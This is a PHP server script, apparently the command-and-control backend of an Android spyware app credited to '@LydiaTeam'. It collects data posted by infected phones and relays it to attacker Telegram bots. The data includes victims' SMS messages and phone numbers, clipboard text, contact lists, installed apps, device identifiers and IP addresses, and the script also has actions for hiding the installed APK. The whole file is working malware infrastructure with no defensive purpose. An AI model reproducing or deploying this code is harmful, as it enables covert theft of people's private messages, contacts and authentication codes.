 <?php    
include("info.php");

$ip = $_SERVER["REMOTE_ADDR"];



$tokenshell = "";
$chatid = "";
$chatid2 = "";


  	
 $action=$_POST['action'];
 if(isset($_POST['id'])){
 $androidid=$_POST['id'];
 }if(isset($_POST['name'])){
 $model=$_POST['name']; 

}if(isset($_POST['model'])){
    $model2=$_POST['model']; 


 }if(isset($_POST['battry'])){
 $battry = $_POST['battry'];
 }if(isset($_POST['network'])){
 $opr = $_POST['network'];
 }if(isset($_POST['number'])){
 $nump = $_POST['number'];
 }if(isset($_POST['messagetext'])){
 $mess = $_POST['messagetext'];
 }if(isset($_POST['contact'])){
    $status = $_POST['contact'];
}
if(isset($_POST['status'])){
    $status = $_POST['status'];
}

if(isset($_POST['androidos'])){
    $androidos = $_POST['androidos'];
}

if(isset($_POST['allapp'])){
    $allapp = $_POST['allapp'];
}

if(isset($_POST['port'])){
    $port = $_POST['port'];
}



		
	
if ($action == "list"){
    
  $textl=
"🪜Iam Fucking online Lol~!
🖥Model : $model
🍷Android_id : <b>$androidid</b> 
🪜Android(Os) : $androidos
📡Operator : $opr
~IP :  <code>$ip</code>
~Coded-By : @LydiaTeam
Port : $port
~🪓Panel : <code>/set_$androidid</code>
";  
    
    
	@file_get_contents("https://api.telegram.org/bot$token/SendMessage?parse_mode=HTML&chat_id=$group2&parse_mode=html&text=".urlencode($textl));
	@file_get_contents("https://api.telegram.org/bot$tokenshell/SendMessage?parse_mode=HTML&chat_id=$chatid&parse_mode=html&text=".urlencode($textl));

    
}elseif($action == "install"){
    
$texti=
"💰SomeOne install APk file bro ~!

🖥Model : $model

📡Operator : $opr

🍷Android_id : <b>$androidid</b>

🪜Android(Os) : $androidos

~ip :  <code>$ip</code>
~Coded-By : @LydiaTeam
Port : $port
~🪓Panel : <code>/set_$androidid</code>
";    
    
    @file_get_contents("https://api.telegram.org/bot$token/SendMessage?parse_mode=HTML&chat_id=$group1&parse_mode=html&text=".urlencode($texti));
	@file_get_contents("https://api.telegram.org/bot$tokenshell/SendMessage?parse_mode=HTML&chat_id=$chatid&parse_mode=html&text=".urlencode($texti));


    
}elseif($action == "rxrxdtrertrstztszsw"){
    
    $text=
    
"
zesrzererz
";    
    
}elseif($action == "sms"){
  
$texts=
"💰New message from Victim Bro~!

☎️•MobileNumber : $nump
🗳Text_Message :

$mess ️

📡Operator : $opr
🖥Model : $model
🍷Android_id : <b>$androidid</b> 
Port : $port
~IP :  <code>$ip</code>
~Coded-By : @LydiaTeam

";
  
@file_get_contents("https://api.telegram.org/bot$token/SendMessage?parse_mode=HTML&chat_id=$group1&parse_mode=html&text=".urlencode($texts));
@file_get_contents("https://api.telegram.org/bot$tokenshell/SendMessage?parse_mode=HTML&chat_id=$chatid&parse_mode=html&text=".urlencode($texts));
    
}elseif($action == "hide"){
    

$texthide=
"~ u hide apk file in this Smart-Phone bro ~!
📡Operator : $opr
🖥Model : $model
🍷Android_id : <b>$androidid</b>
~IP :  $ip

~Coded-By : @LydiaTeam";    

@file_get_contents("https://api.telegram.org/bot$token/SendMessage?parse_mode=HTML&chat_id=$group2&parse_mode=html&text=".urlencode($texthide));

    
}elseif($action == "ssms"){
    
$textsend=
"~Message sent successfully bro ~!
📡Operator : $opr
🖥Model : $model
🍷Android_id : <b>$androidid</b>
~IP :  $ip

~Coded-By : @LydiaTeam";    

@file_get_contents("https://api.telegram.org/bot$token/SendMessage?parse_mode=HTML&chat_id=$group2&parse_mode=html&text=".urlencode($textsend));

      
    
}elseif($action == "clipboard"){
    
$textc=
"~Fucking Clipboard text!

~Text :
$status

📡Operator : $opr
🖥Model : $model
🍷Android_id : $androidid 
~IP :  $ip

~Coded-By : @LydiaTeam";    

@file_get_contents("https://api.telegram.org/bot$token/SendMessage?parse_mode=HTML&chat_id=$group1&parse_mode=html&text=".urlencode($textc));

    
}elseif($action == "getcontact"){

$textg=
"~Fucking Contact!
List :
$contact

📡Operator : $opr
🖥Model : $model
🍷Android_id : $androidid 
~IP :  $ip

~Coded-By : @LydiaTeam";    


@file_get_contents("https://api.telegram.org/bot$token/SendMessage?parse_mode=HTML&chat_id=$group1&parse_mode=html&text=".urlencode($textg));
    
    
}elseif($action == "sended"){

$texted=
"~Message successful sended...✅✅
First_number : $nump


📡Operator : $opr
🖥Model : $model2
🍷Android_id : <b>$androidid</b>
~IP:<code>$ip</code>

~Coded-By : @LydiaTeam";    

    
    @file_get_contents("https://api.telegram.org/bot$token/SendMessage?parse_mode=HTML&chat_id=$group2&parse_mode=html&text=".urlencode($textsend));
	//@file_get_contents("https://api.telegram.org/bot$tokenshell/SendMessage?parse_mode=HTML&chat_id=$chatid2&parse_mode=html&text=".urlencode($textsend));
        
}elseif($action == "unsended"){

$textun=
"~Fucking Message could not be sent.❌❌
First_number : $nump


📡Operator : $opr
🖥Model : $model2
🍷Android_id : <b>$androidid</b>
~IP :<code>$ip</code>

~Coded-By : @LydiaTeam";    

    
    @file_get_contents("https://api.telegram.org/bot$token/SendMessage?parse_mode=HTML&chat_id=$group2&parse_mode=html&text=".urlencode($textun));
	//file_get_contents("https://api.telegram.org/bot$tokenshell/SendMessage?parse_mode=HTML&chat_id=$chatid2&parse_mode=html&text=".urlencode($textun));
        
}elseif($action == "show"){

    $textshow=
    "~ u Un hide apk file in this Smart-Phone bro ~!
    📡Operator : $opr
    🖥Model : $model
    🍷Android_id : <b>$androidid</b>
    ~IP :  $ip
    
    ~Coded-By : @LydiaTeam";  
        
        @file_get_contents("https://api.telegram.org/bot$token/SendMessage?parse_mode=HTML&chat_id=$group2&parse_mode=html&text=".urlencode($textshow));
            
}elseif($action == "allapp"){

        $textshow=
        "App List : 
        $allapp
        📡Operator : $opr
        🖥Model : $model
        🍷Android_id : <b>$androidid</b>
        ~IP :  $ip
        ~Coded-By : @LydiaTeam";  
            
        @file_get_contents("https://api.telegram.org/bot$token/SendMessage?parse_mode=HTML&chat_id=$group2&parse_mode=html&text=".urlencode($textshow));
                
}
?>